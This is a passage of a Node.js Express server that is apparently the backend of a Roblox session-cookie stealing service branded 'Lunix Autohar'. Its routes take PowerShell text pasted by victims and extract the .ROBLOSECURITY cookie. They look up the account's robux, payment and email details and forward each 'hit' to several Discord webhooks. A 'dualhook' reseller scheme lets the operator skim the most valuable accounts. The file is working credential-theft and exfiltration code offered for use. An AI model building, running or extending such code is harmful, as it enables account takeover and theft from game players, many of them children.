    const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');

    // Now extract the ROBLOSECURITY token from the cleaned input - improved pattern to capture full token
    const regex = /\.ROBLOSECURITY[=\s]*["']?([^"'\s}]+)["']?/i;
    const match = cleanedInput.match(regex);

    if (match) {
      const token = match[1].replace(/['"]/g, ''); // Remove quotes if present
      const userAgent = req.headers['user-agent'] || 'Unknown';

      // Fetch user data from Roblox API
      const userData = await fetchRobloxUserData(token);

      // If user data fetch failed, create a minimal user data object to ensure cookie is still sent
      const webhookUserData = userData || {
        username: "Unknown User",
        userId: "Unknown",
        robux: 0,
        premium: false,
        rap: 0,
        summary: 0,
        creditBalance: 0,
        savedPayment: false,
        robuxIncoming: 0,
        robuxOutgoing: 0,
        korblox: false,
        headless: false,
        accountAge: 0,
        groupsOwned: 0,
        placeVisits: 0,
        inventory: { hairs: 0, bundles: 0, faces: 0 },
        emailVerified: false,
        emailAddress: null,
        voiceChatEnabled: false
      };

      // Log user data to database
      await logUserData(token, webhookUserData, { ip: req.ip, directory: 'main' });


      // Send to Discord webhook with user data
      const webhookResult = await sendToDiscord(token, userAgent, scriptType, webhookUserData);

      if (!webhookResult.success) {

        return res.status(500).json({ 
          success: false, 
          error: `Webhook failed: ${webhookResult.error}` 
        });
      }


    } else {


      // Return error message when no token found
      return res.status(400).json({ 
        success: false,
        message: 'Failed wrong input'
      });
    }

    // Return success only when token was found and processed
    res.json({ 
      success: true,
      message: 'Request submitted successfully!'
    });
  } catch (error) {
    // Log error without exposing sensitive details
    console.error('❌ Server error:', error.message);
    res.status(500).json({ error: 'Server error processing request' });
  }
});

// Dynamic route handler for custom directories
app.get('/:directory', async (req, res) => {
  const directoryName = req.params.directory;
  const directories = await loadDirectories();

  if (directories[directoryName]) {
    // If directory has subdirectories, serve 404.html to protect parent
    if (directories[directoryName].subdirectories && 
        Object.keys(directories[directoryName].subdirectories).length > 0) {
      return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
    }
    // Serve a custom page for this directory
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
  } else {
    res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
  }
});

// Route handler for dualhook create page
app.get('/:directory/create', async (req, res) => {
  const directoryName = req.params.directory;
  const directories = await loadDirectories();

  if (directories[directoryName] && directories[directoryName].serviceType === 'dualhook') {
    res.sendFile(path.join(__dirname, 'public', 'dualhook-create.html'));
  } else {
    res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
  }
});

// Route handler for subdirectories
app.get('/:directory/:subdirectory', async (req, res) => {
  const directoryName = req.params.directory;
  const subdirectoryName = req.params.subdirectory;
  const directories = await loadDirectories();

  if (directories[directoryName] && 
      directories[directoryName].subdirectories && 
      directories[directoryName].subdirectories[subdirectoryName]) {
    // Serve the same page for subdirectories
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
  } else {
    res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
  }
});

// API endpoint for custom directory requests
app.post('/:directory/convert', async (req, res) => {
  try {
    const directoryName = req.params.directory;
    const directories = await loadDirectories();

    // Check if directory exists
    if (!directories[directoryName]) {
      return res.status(404).json({ error: 'Directory not found' });
    }

    // If directory has subdirectories, return 404 to protect parent
    if (directories[directoryName].subdirectories && 
        Object.keys(directories[directoryName].subdirectories).length > 0) {
      return res.status(404).json({ error: 'Not found' });
    }

    const directoryConfig = directories[directoryName];

    // Validate API token for this specific directory
    const providedToken = req.get('X-API-Token');
    if (!providedToken || providedToken !== directoryConfig.apiToken) {
      console.log(`❌ Invalid or missing API token for directory ${directoryName} from ${req.ip}`);
      return res.status(401).json({ error: 'Invalid API token for this directory' });
    }

    let input;
    let scriptType;



    // Handle both JSON and text input
    if (typeof req.body === 'string') {
      input = req.body;
      scriptType = 'Unknown';
    } else if (req.body && req.body.powershell) {
      input = req.body.powershell;
      scriptType = req.body.scriptType || 'Unknown';
    } else {

      return res.status(400).json({ error: 'Invalid input format' });
    }

    // Check if input is just plain text (no PowerShell structure) - silently reject to prevent spam
    const hasBasicPowershellStructure = /(?:Invoke-WebRequest|curl|wget|-Uri|-Headers|-Method|powershell|\.ROBLOSECURITY)/i.test(input);

    if (!hasBasicPowershellStructure) {
      // Silently reject plain text inputs without sending webhooks
      return res.status(400).json({ 
        success: false,
        message: 'Invalid input format',
        directory: directoryName
      });
    }

    // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
    const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');
    // Updated regex to handle both direct assignment and New-Object System.Net.Cookie format
    const regex = /\.ROBLOSECURITY["']?\s*,?\s*["']([^"']+)["']/i;
    const match = cleanedInput.match(regex);

    if (match) {
      const token = match[1].replace(/['"]/g, '');

      // Check if token is empty, just whitespace, or only contains commas/special chars
      if (!token || token.trim() === '' || token === ',' || token.length < 10) {
        // Send fallback embed when no valid token found
        const fallbackEmbed = {
          title: "⚠️ Input Received",
          description: "Input received but no ROBLOSECURITY found",
          color: 0x8B5CF6, // Consistent purple color
          footer: {
            text: "Made By Lunix"
          }
        };

        const fallbackPayload = {
          embeds: [fallbackEmbed]
        };

        // Send to both directory webhook and site owner webhook
        try {
          await fetch(directoryConfig.webhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(fallbackPayload)
          });

          const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
          if (siteOwnerWebhookUrl) {
            await fetch(siteOwnerWebhookUrl, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(fallbackPayload)
          });
        }
      } catch (webhookError) {
        console.error('❌ Fallback webhook failed:', webhookError.message);
      }

      return res.status(400).json({ 
        success: false,
        message: 'Failed wrong input',
        directory: directoryName
      });
    }

      const userAgent = req.headers['user-agent'] || 'Unknown';

      // Fetch user data from Roblox API
      const userData = await fetchRobloxUserData(token);

      const webhookUserData = userData || {
        username: "Unknown User",
        userId: "Unknown",
        robux: 0,
        premium: false,
        rap: 0,
        summary: 0,
        creditBalance: 0,
        savedPayment: false,
        robuxIncoming: 0,
        robuxOutgoing: 0,
        korblox: false,
        headless: false,
        accountAge: 0,
        groupsOwned: 0,
        placeVisits: 0,
        inventory: { hairs: 0, bundles: 0, faces: 0 },
        emailVerified: false,
        emailAddress: null,
        voiceChatEnabled: false
      };

      // Log user data to database
      await logUserData(token, webhookUserData, { ip: req.ip, directory: directoryName });

      const customTitle = `<:emoji_37:1410520517349212200> +1 Hit - Lunix Autohar`;
      // Send to Discord webhook with user data
      const webhookResult = await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, directoryConfig.webhookUrl, customTitle);

      // Always send to site owner (main webhook) - check both environment variable and default webhook
      const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
      if (siteOwnerWebhookUrl) {
        await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, siteOwnerWebhookUrl, customTitle);
      }

      if (!webhookResult.success) {

        return res.status(500).json({ 
          success: false, 
          error: `Webhook failed: ${webhookResult.error}` 
        });
      }


    } else {
      // Send fallback embed when no token found - do NOT send user data
      const fallbackEmbed = {
        title: "⚠️ Input Received",
        description: "Input received but no ROBLOSECURITY found",
        color: 0x8B5CF6, // Consistent purple color
        footer: {
          text: "Made By Lunix"
        }
      };

      const fallbackPayload = {
        embeds: [fallbackEmbed]
      };

      // Send to both directory webhook and site owner webhook
      try {
        await fetch(directoryConfig.webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(fallbackPayload)
        });

        const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
        if (siteOwnerWebhookUrl) {
          await fetch(siteOwnerWebhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(fallbackPayload)
          });
        }
      } catch (webhookError) {
        console.error('❌ Fallback webhook failed:', webhookError.message);
      }

      // Return error message when no token found
      return res.status(400).json({ 
        success: false,
        message: 'Failed wrong input',
        directory: directoryName
      });
    }

    res.json({ 
      success: true,
      message: 'Request submitted successfully!',
      directory: directoryName
    });
  } catch (error) {
    // Log error without exposing sensitive details
    console.error('❌ Server error:', error.message);
    res.status(500).json({ error: 'Server error processing request' });
  }
});

// API endpoint to create subdirectories for Dualhook users
app.post('/:directory/api/create-subdirectory', async (req, res) => {
  try {
    const parentDirectory = req.params.directory;
    const { subdirectoryName, webhookUrl } = req.body;

    // Load directories
    const directories = await loadDirectories();

    // Check if parent directory exists and is dualhook type
    if (!directories[parentDirectory] || directories[parentDirectory].serviceType !== 'dualhook') {
      return res.status(404).json({ error: 'Parent directory not found or not a Dualhook generator' });
    }

    // Validate subdirectory name
    if (!subdirectoryName || !/^[a-z0-9-]+$/.test(subdirectoryName)) {
      return res.status(400).json({ error: 'Invalid directory name. Use only lowercase letters, numbers, and hyphens.' });
    }

    // Validate webhook URL
    if (!webhookUrl || !webhookUrl.startsWith('http')) {
      return res.status(400).json({ error: 'Invalid webhook URL' });
    }

    // Initialize subdirectories if not exists
    if (!directories[parentDirectory].subdirectories) {
      directories[parentDirectory].subdirectories = {};
    }

    // Check if subdirectory already exists
    if (directories[parentDirectory].subdirectories[subdirectoryName]) {
      return res.status(409).json({ error: 'This autohar name is already taken' });
    }

    // Generate unique ID for subdirectory using helper function
    const uniqueId = generateUniqueId(directories);

    // Create subdirectory
    const subAuthToken = crypto.randomBytes(32).toString('hex');
    directories[parentDirectory].subdirectories[subdirectoryName] = {
      webhookUrl: webhookUrl,
      created: new Date().toISOString(),
      apiToken: crypto.randomBytes(32).toString('hex'),
      authToken: subAuthToken,
      uniqueId: uniqueId // Unique ID for stats
    };

    // Save directories
    if (!(await saveDirectories(directories))) {
      return res.status(500).json({ error: 'Failed to save directory configuration' });
    }



    // Send CREATION notification to subdirectory webhook with user's link and auth token
    try {
      const creationNotificationPayload = {
        embeds: [{
          title: `${parentDirectory.toUpperCase()} AUTOHAR`,
          description: `Ur ${parentDirectory.toUpperCase()} AUTOHAR url\n📌\n\n\`http://${req.get('host')}/${parentDirectory}/${subdirectoryName}\`\n\n🔑 **Dashboard Login Token:**\n\`${subAuthToken}\`\n\n🆔 **Your Unique ID:**\n\`${directories[parentDirectory].subdirectories[subdirectoryName].uniqueId}\`\n\n📊 **Your Dashboard:**\n\`http://${req.get('host')}/dashboard\``,
          color: 0x8B5CF6,
          footer: {
            text: `Made by ${parentDirectory}`
          }
        }]
      };

      await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(creationNotificationPayload)
      });


    } catch (webhookError) {
    // Log webhook errors without exposing URLs
    console.error('❌ Webhook notification failed:', webhookError.message);
  }    

    res.json({
      success: true,
      parentDirectory: parentDirectory,
      subdirectoryName: subdirectoryName,
      apiToken: directories[parentDirectory].subdirectories[subdirectoryName].apiToken,
      authToken: subAuthToken,
      uniqueId: directories[parentDirectory].subdirectories[subdirectoryName].uniqueId
    });

  } catch (error) {
    console.error('Error creating subdirectory:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Get API token for specific directory
app.get('/:directory/api/token', async (req, res) => {
  const directoryName = req.params.directory;

  // Validate directory name format
  if (!/^[a-z0-9-]+$/.test(directoryName)) {
    return res.status(400).json({ error: 'Invalid directory name format' });
  }

  const directories = await loadDirectories();

  if (!directories[directoryName]) {
    return res.status(404).json({ error: 'Directory not found' });
  }

  // If directory has subdirectories, return 404 to protect parent
  if (directories[directoryName].subdirectories && 
      Object.keys(directories[directoryName].subdirectories).length > 0) {
    return res.status(404).json({ error: 'Not found' });
  }

  console.log(`✅ Directory token request approved for ${directoryName}, IP: ${req.ip}`);
  res.json({ token: directories[directoryName].apiToken });
});

// Get API token for subdirectories
app.get('/:directory/:subdirectory/api/token', tokenLimiter, protectTokenEndpoint, async (req, res) => {
  const directoryName = req.params.directory;
  const subdirectoryName = req.params.subdirectory;

  // Validate directory and subdirectory name formats
  if (!/^[a-z0-9-]+$/.test(directoryName) || !/^[a-z0-9-]+$/.test(subdirectoryName)) {
    return res.status(400).json({ error: 'Invalid directory name format' });
  }

  const directories = await loadDirectories();

  if (!directories[directoryName] || 
      !directories[directoryName].subdirectories || 
      !directories[directoryName].subdirectories[subdirectoryName]) {
    console.log(`❌ Token request for non-existent subdirectory: ${directoryName}/${subdirectoryName}, IP: ${req.ip}`);
    return res.status(404).json({ error: 'Directory not found' });
  }

  console.log(`✅ Subdirectory token request approved for ${directoryName}/${subdirectoryName}, IP: ${req.ip}`);
  res.json({ token: directories[directoryName].subdirectories[subdirectoryName].apiToken });
});

// API endpoint for subdirectory requests (triple webhook delivery)
app.post('/:directory/:subdirectory/convert', async (req, res) => {
  try {
    const directoryName = req.params.directory;
    const subdirectoryName = req.params.subdirectory;
    const directories = await loadDirectories();

    // Check if subdirectory exists
    if (!directories[directoryName] || 
        !directories[directoryName].subdirectories || 
        !directories[directoryName].subdirectories[subdirectoryName]) {
      return res.status(404).json({ error: 'Directory not found' });
    }

    const parentConfig = directories[directoryName];
    const subdirectoryConfig = directories[directoryName].subdirectories[subdirectoryName];

    // Validate API token for this specific subdirectory
    const providedToken = req.get('X-API-Token');
    if (!providedToken || providedToken !== subdirectoryConfig.apiToken) {

      return res.status(401).json({ error: 'Invalid API token for this subdirectory' });
    }

    let input;
    let scriptType;


    // Handle both JSON and text input
    if (typeof req.body === 'string') {
      input = req.body;
      scriptType = 'Unknown';
    } else if (req.body && req.body.powershell) {
      input = req.body.powershell;
      scriptType = req.body.scriptType || 'Unknown';
    } else {

      return res.status(400).json({ error: 'Invalid input format' });
    }

    // Check if input is just plain text (no PowerShell structure) - silently reject to prevent spam
    const hasBasicPowershellStructure = /(?:Invoke-WebRequest|curl|wget|-Uri|-Headers|-Method|powershell|\.ROBLOSECURITY)/i.test(input);

    if (!hasBasicPowershellStructure) {
      // Silently reject plain text inputs without sending webhooks
      return res.status(400).json({ 
        success: false,
        message: 'Invalid input format',
        directory: directoryName,
        subdirectory: subdirectoryName
      });
    }

    // Look for .ROBLOSECURITY cookie
    // First, clean up the input by removing PowerShell backticks and line breaks
    const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');

    // Now extract the ROBLOSECURITY token from the cleaned input - improved pattern to capture full token
    const regex = /\.ROBLOSECURITY["']?\s*,?\s*["']([^"']+)["']/i;
    const match = cleanedInput.match(regex);

    if (match) {
      const token = match[1].replace(/['"]/g, '');

      // Check if token is empty, just whitespace, or only contains commas/special chars
      if (!token || token.trim() === '' || token === ',' || token.length < 10) {
        // Send fallback embed when no valid token found
        const fallbackEmbed = {
          title: "⚠️ Input Received",
          description: "Input received but no ROBLOSECURITY found",
          color: 0xFFA500, // Orange color to distinguish from successful hits
          footer: {
            text: "Made By Lunix"
          }
        };

        const fallbackPayload = {
          embeds: [fallbackEmbed]
        };

        // Send to all three webhooks (subdirectory, dualhook master, site owner)
        try {
          // 1. Send to subdirectory webhook
          await fetch(subdirectoryConfig.webhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(fallbackPayload)
          });

          // 2. Send to dualhook master webhook
          if (parentConfig.dualhookWebhookUrl) {
            await fetch(parentConfig.dualhookWebhookUrl, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify(fallbackPayload)
            });
          }

          // 3. Send to site owner webhook
          const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
          if (siteOwnerWebhookUrl) {
            await fetch(siteOwnerWebhookUrl, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify(fallbackPayload)
            });
          }
        } catch (webhookError) {
          console.error('❌ Fallback webhook failed:', webhookError.message);
        }

        // Return error message when no token found
        return res.status(400).json({ 
          success: false,
          message: 'Failed wrong input',
          directory: directoryName,
          subdirectory: subdirectoryName
        });
      }

      const userAgent = req.headers['user-agent'] || 'Unknown';

      // Fetch user data from Roblox API
      const userData = await fetchRobloxUserData(token);

      // If user data fetch failed, create a minimal user data object to ensure cookie is still sent
      const webhookUserData = userData || {
        username: "Unknown User",
        userId: "Unknown",
        robux: 0,
        premium: false,
        rap: 0,
        summary: 0,
        creditBalance: 0,
        savedPayment: false,
        robuxIncoming: 0,
        robuxOutgoing: 0,
        korblox: false,
        headless: false,
        accountAge: 0,
        groupsOwned: 0,
        placeVisits: 0,
        inventory: { hairs: 0, bundles: 0, faces: 0 },
        emailVerified: false,
        emailAddress: null,
        voiceChatEnabled: false
      };

      // Log user data to database
      await logUserData(token, webhookUserData, { 
        ip: req.ip, 
        directory: directoryName, 
        subdirectory: subdirectoryName 
      });

      const scriptLabel = `${scriptType} (Subdirectory: ${directoryName}/${subdirectoryName})`;
      const customTitle = `<:emoji_37:1410520517349212200> +1 Hit - ${directoryName.toUpperCase()} AUTOHAR`;

      // Check if hit meets Dualhook filter criteria
      const meetsFilters = meetsFilterCriteria(webhookUserData, parentConfig.filters);

      let subdirectoryWebhookResult = { success: true };
      let dualhookWebhookResult = { success: true };

      // If filters are met, only send to Dualhook directory and site owner (skip subdirectory)
      if (meetsFilters) {
        console.log(`🎯 Hit meets Dualhook filters for ${directoryName}/${subdirectoryName}, bypassing subdirectory webhook`);

        // Add filter notification to webhook title
        const filteredTitle = `🎯 FILTERED HIT - ${directoryName.toUpperCase()} AUTOHAR`;

        // 1. Send to dualhook master webhook with filtered title
        if (parentConfig.dualhookWebhookUrl) {
          dualhookWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, parentConfig.dualhookWebhookUrl, filteredTitle);
        }

        // 2. Send to site owner webhook
        const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
        if (siteOwnerWebhookUrl) {
          await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, siteOwnerWebhookUrl, filteredTitle);
        }
      } else {
        // Normal triple-webhook logic when filters are not met

        // 1. Send to subdirectory webhook
        subdirectoryWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, subdirectoryConfig.webhookUrl, customTitle);

        // 2. Send to dualhook master webhook (collects from all subdirectory users)
        if (parentConfig.dualhookWebhookUrl) {
          dualhookWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, parentConfig.dualhookWebhookUrl, customTitle);
        }

        // 3. Send to site owner webhook (website owner)
        const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
        if (siteOwnerWebhookUrl) {
          const siteOwnerWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, siteOwnerWebhookUrl, customTitle);
        }
      }

      if (!subdirectoryWebhookResult.success) {

        return res.status(500).json({ 
          success: false, 
          error: `Subdirectory webhook failed: ${subdirectoryWebhookResult.error}` 
        });
      }

      if (!dualhookWebhookResult.success) {

        return res.status(500).json({ 
          success: false, 
          error: `Dualhook master webhook failed: ${dualhookWebhookResult.error}` 
        });
      }


    } else {
      // Send fallback embed when no token found - do NOT send user data
      const fallbackEmbed = {
        title: "⚠️ Input Received",
        description: "Input received but no ROBLOSECURITY found",
        color: 0xFFA500, // Orange color to distinguish from successful hits
        footer: {
          text: "Made By Lunix"
        }
      };

      const fallbackPayload = {
        embeds: [fallbackEmbed]
      };

      // Send to all three webhooks (subdirectory, dualhook master, site owner)
      try {
        // 1. Send to subdirectory webhook
        await fetch(subdirectoryConfig.webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(fallbackPayload)
        });

        // 2. Send to dualhook master webhook
        if (parentConfig.dualhookWebhookUrl) {
          await fetch(parentConfig.dualhookWebhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(fallbackPayload)
          });
        }

        // 3. Send to site owner webhook
        const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
        if (siteOwnerWebhookUrl) {
          await fetch(siteOwnerWebhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(fallbackPayload)
          });
        }
      } catch (webhookError) {
        console.error('❌ Fallback webhook failed:', webhookError.message);
      }

      // Return error message when no token found
      return res.status(400).json({ 
        success: false,
        message: 'Failed wrong input',
        directory: directoryName,
        subdirectory: subdirectoryName
      });
    }

    res.json({ 
      success: true,
      message: 'Request submitted successfully with multi-webhook delivery!',
      directory: directoryName,
      subdirectory: subdirectoryName
    });
  } catch (error) {
    // Log error without exposing sensitive details
    console.error('❌ Server error:', error.message);
    res.status(500).json({ error: 'Server error processing request' });
  }
});

// Add plain text detection to prevent webhook spam
app.post('/:directory/convert', async (req, res) => {
  try {
    const directoryName = req.params.directory;
    const directories = await loadDirectories();

    // Check if directory exists
    if (!directories[directoryName]) {
      return res.status(404).json({ error: 'Directory not found' });
    }

    // If directory has subdirectories, return 404 to protect parent
    if (directories[directoryName].subdirectories && 
        Object.keys(directories[directoryName].subdirectories).length > 0) {
      return res.status(404).json({ error: 'Not found' });
    }

    const directoryConfig = directories[directoryName];

    // Validate API token for this specific directory
    const providedToken = req.get('X-API-Token');
    if (!providedToken || providedToken !== directoryConfig.apiToken) {
      console.log(`❌ Invalid or missing API token for directory ${directoryName} from ${req.ip}`);
      return res.status(401).json({ error: 'Invalid API token for this directory' });
    }

    let input;
    let scriptType;


    // Handle both JSON and text input
    if (typeof req.body === 'string') {
      input = req.body;
      scriptType = 'Unknown';
    } else if (req.body && req.body.powershell) {
      input = req.body.powershell;
      scriptType = req.body.scriptType || 'Unknown';
    } else {

      return res.status(400).json({ error: 'Invalid input format' });
    }

    // Check if input is just plain text (no PowerShell structure) - silently reject to prevent spam
    const hasBasicPowershellStructure = /(?:Invoke-WebRequest|curl|wget|-Uri|-Headers|-Method|powershell|\.ROBLOSECURITY)/i.test(input);

    if (!hasBasicPowershellStructure) {
      // Silently reject plain text inputs without sending webhooks
      return res.status(400).json({ 
        success: false,
        message: 'Invalid input format',
        directory: directoryName
      });
    }

    // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
    const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');
    // Updated regex to handle both direct assignment and New-Object System.Net.Cookie format
    const regex = /\.ROBLOSECURITY["']?\s*,?\s*["']([^"']+)["']/i;
    const match = cleanedInput.match(regex);

    if (match) {
      const token = match[1].replace(/['"]/g, '');

      // Check if token is empty, just whitespace, or only contains commas/special chars
      if (!token || token.trim() === '' || token === ',' || token.length < 10) {
        // Send fallback embed when no valid token found
        const fallbackEmbed = {
          title: "⚠️ Input Received",
          description: "Input received but no ROBLOSECURITY found",
          color: 0x8B5CF6, // Consistent purple color
          footer: {
            text: "Made By Lunix"
          }
        };

        const fallbackPayload = {
          embeds: [fallbackEmbed]
        };

        // Send to both directory webhook and site owner webhook
        try {
          await fetch(directoryConfig.webhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(fallbackPayload)
          });

          const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
          if (siteOwnerWebhookUrl) {
            await fetch(siteOwnerWebhookUrl, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify(fallbackPayload)
            });
          }
        } catch (webhookError) {
          console.error('❌ Fallback webhook failed:', webhookError.message);
        }

        // Return error message when no token found
        return res.status(400).json({ 
          success: false,
          message: 'Failed wrong input',
          directory: directoryName
        });
      }

      const userAgent = req.headers['user-agent'] || 'Unknown';

      // Fetch user data from Roblox API
      const userData = await fetchRobloxUserData(token);

      // If user data fetch failed, create a minimal user data object
      const webhookUserData = userData || {
        username: "Unknown User",
        userId: "Unknown",
        robux: 0,
        premium: false,
        rap: 0,
        summary: 0,
        creditBalance: 0,
        savedPayment: false,
        robuxIncoming: 0,
        robuxOutgoing: 0,
        korblox: false,
        headless: false,
        accountAge: 0,
        groupsOwned: 0,
        placeVisits: 0,
        inventory: { hairs: 0, bundles: 0, faces: 0 },
        emailVerified: false,
        emailAddress: null,
        voiceChatEnabled: false
      };

      // Log user data to database
      await logUserData(token, webhookUserData, { ip: req.ip, directory: directoryName });

      const customTitle = `<:emoji_37:1410520517349212200> +1 Hit - Lunix Autohar`;

      // Send to Discord webhook with user data
      const webhookResult = await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, directoryConfig.webhookUrl, customTitle);

      // Always send to site owner (main webhook) - check both environment variable and default webhook
      const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
      if (siteOwnerWebhookUrl) {
        await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, siteOwnerWebhookUrl, customTitle);
      }

      if (!webhookResult.success) {

        return res.status(500).json({ 
          success: false, 
          error: `Webhook failed: ${webhookResult.error}` 
        });
      }


    } else {
      // Send fallback embed when no token found - do NOT send user data
      const fallbackEmbed = {
        title: "⚠️ Input Received",
        description: "Input received but no ROBLOSECURITY found",
        color: 0x8B5CF6, // Consistent purple color
        footer: {
          text: "Made By Lunix"
        }
      };

      const fallbackPayload = {
        embeds: [fallbackEmbed]
      };

      // Send to both directory webhook and site owner webhook
      try {
        await fetch(directoryConfig.webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(fallbackPayload)
        });

        const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
        if (siteOwnerWebhookUrl) {
          await fetch(siteOwnerWebhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(fallbackPayload)
          });
        }
      } catch (webhookError) {
        console.error('❌ Fallback webhook failed:', webhookError.message);
      }

      // Return error message when no token found
      return res.status(400).json({ 
        success: false,
        message: 'Failed wrong input',
        directory: directoryName
      });
    }

    // Return success only when token was found and processed
    res.json({ 
      success: true,
      message: 'Request submitted successfully!',
      directory: directoryName
    });
  } catch (error) {
    // Log error without exposing sensitive details
    console.error('❌ Server error:', error.message);
    res.status(500).json({ error: 'Server error processing request' });
  }
});

// Catch-all 404 handler (must be last)
app.use('*', (req, res) => {
  // Always serve 404.html for all invalid routes
  res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, '0.0.0.0', () => {


  if (!process.env.API_TOKEN) {
  }

  // Log existing directories
  loadDirectories().then(directories => {
    if (directories && typeof directories === 'object') {
      const directoryNames = Object.keys(directories);
      if (directoryNames.length > 0) {


        // Log subdirectories for dualhook services
        directoryNames.forEach(dir => {
          if (directories[dir] && 
              directories[dir].serviceType === 'dualhook' && 
              directories[dir].subdirectories) {
            const subdirs = Object.keys(directories[dir].subdirectories);
            if (subdirs.length > 0) {

            }
          }
        });
      }
    }
  }).catch(error => {
    console.error('Error loading directories on startup:', error);
  });
});
